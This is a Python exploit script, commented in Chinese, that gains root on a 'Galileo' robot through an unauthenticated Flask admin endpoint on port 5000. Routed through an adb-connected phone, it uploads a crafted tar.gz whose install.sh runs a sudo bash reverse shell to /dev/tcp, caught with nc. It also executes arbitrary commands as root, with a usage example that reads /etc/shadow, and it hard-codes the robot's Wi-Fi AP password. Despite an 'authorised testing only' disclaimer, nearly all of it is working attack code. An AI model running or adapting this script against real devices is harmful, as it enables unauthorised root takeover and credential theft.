#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
伽利略（Galileo）机器人 Flask 后台未授权 RCE 一键拿 root shell 脚本

漏洞：Flask 管理后台（5000 端口）未授权，/upload 接口接收 .tar.gz 并自动执行
其中的 install.sh 脚本 → 任意命令执行（galileo）；命令带 sudo 前缀时直接以
root 执行（galileo 免密 sudo，见漏洞 2）。

链路：电脑 → USB 手机(adb) → WiFi → 机器人。
脚本自动：构造恶意 tar.gz（install.sh 反弹 root shell）→ 上传 → 手机 nc 接回
→ 接到电脑终端交互。

用法（PowerShell，cd 到本目录）：
  python get_shell.py                 # 一键交互式 root shell（sudo 反弹）
  python get_shell.py -c "id"         # 单命令模式：执行并回显（自动带 sudo）
  python get_shell.py -c "cat /etc/shadow | head -3"

前置：手机 USB 连接（adb 可见）+ 手机已连机器人 AP（C1W-1.0-007 / 88888888）。
依赖：Python 3 标准库 + adb。
仅用于授权测试/防御研究。
"""
import io
import json
import re
import subprocess
import sys
import tarfile
import tempfile
import threading
import time

ADB = "adb"
ROBOT = "192.168.2.1"
PORT = 4444


def sh(args, timeout=30):
    """执行 adb 命令，统一 utf-8 解码（避免 Windows GBK 崩溃）。"""
    p = subprocess.run(args, capture_output=True, timeout=timeout)
    out = p.stdout.decode("utf-8", "replace") if isinstance(p.stdout, bytes) else p.stdout
    return out


def get_device():
    out = sh([ADB, "devices"], 10)
    for line in out.split("\n")[1:]:
        if "\tdevice" in line:
            return line.split("\t")[0]
    return None


def get_phone_ip(device):
    out = sh([ADB, "-s", device, "shell", "ip addr show wlan0"], 10)
    m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)/", out)
    return m.group(1) if m else None


def build_tar(script_content: str) -> bytes:
    """构造含 install.sh 的恶意 .tar.gz。"""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        payload = ("#!/bin/sh\n" + script_content + "\n").encode()
        info = tarfile.TarInfo(name="install.sh")
        info.size = len(payload)
        info.mode = 0o755
        tar.addfile(info, io.BytesIO(payload))
    return buf.getvalue()


def upload(device, tar_bytes):
    """push tar.gz 到手机并上传到机器人 /upload。"""
    import os
    fd, local = tempfile.mkstemp(suffix=".tar.gz")
    with open(local, "wb") as f:
        f.write(tar_bytes)
    os.close(fd)
    remote = "/data/local/tmp/exploit.tar.gz"
    subprocess.run([ADB, "-s", device, "push", local, remote],
                   capture_output=True, timeout=30)
    os.remove(local)
    curl = f"curl -s -X POST http://{ROBOT}:5000/upload -F 'file=@{remote}'"
    return sh([ADB, "-s", device, "shell", curl])


def exec_cmd(device, cmd):
    """经 /upload 以 root 执行命令（自动 sudo），输出 base64 落盘后回读解码。"""
    import base64 as b64mod
    out = "/tmp/exploit_out.txt"
    script = f"sudo sh -c '{cmd} | base64 > {out} 2>&1'"
    upload(device, build_tar(script))
    time.sleep(1.5)
    body = json.dumps({"script": out, "args": ""})
    curl = (f"curl -s -X POST http://{ROBOT}:5000/run_script "
            f"-H 'Content-Type: application/json' -d '{body}'")
    resp = sh([ADB, "-s", device, "shell", curl])
    try:
        data = json.loads(resp)
    except Exception:
        return f"[响应解析失败] {resp[:200]}"
    stderr = data.get("stderr", "")
    b64 = ""
    for line in stderr.split("\n"):
        m = re.match(r"^[^:]+: \d+: ([A-Za-z0-9+/=]+): not found$", line)
        if m:
            b64 += m.group(1)
    try:
        return b64mod.b64decode(b64).decode("utf-8", "ignore")
    except Exception:
        return b64 or f"[无输出/回读失败] stderr片段: {stderr[:150]}"


def rev_shell(device):
    """反弹交互式 root shell：install.sh 以 sudo 反弹到手机 4444，接回电脑终端。"""
    phone_ip = get_phone_ip(device)
    if not phone_ip:
        print("[-] 获取手机 IP 失败（手机 WiFi 未连机器人 AP？）")
        sys.exit(1)
    print(f"[*] 手机 IP: {phone_ip}  反弹端口: {PORT}")

    def trigger():
        time.sleep(1)
        rev = (f"nohup sudo bash -c 'bash -i >& /dev/tcp/{phone_ip}/{PORT} 0>&1' "
               f"> /dev/null 2>&1 &")
        upload(device, build_tar(rev))

    threading.Thread(target=trigger).start()
    print("[*] 已触发 root 反弹（sudo 前缀），等待连接（Ctrl+C 退出）...")
    print("[*] 进入后 id 应显示 uid=0(root)")
    print()
    subprocess.run([ADB, "-s", device, "shell", f"nc -l -p {PORT}"])


def main():
    device = get_device()
    if not device:
        print("[-] 未找到在线 adb 设备（检查手机 USB）")
        sys.exit(1)
    print(f"[*] adb 设备: {device}")

    if len(sys.argv) >= 3 and sys.argv[1] == "-c":
        cmd = sys.argv[2]
        print(f"[*] 经 /upload 以 root 执行: {cmd}")
        out = exec_cmd(device, cmd)
        print("-" * 60)
        print(out if out else "(无输出)")
        print("-" * 60)
    else:
        rev_shell(device)


if __name__ == "__main__":
    main()
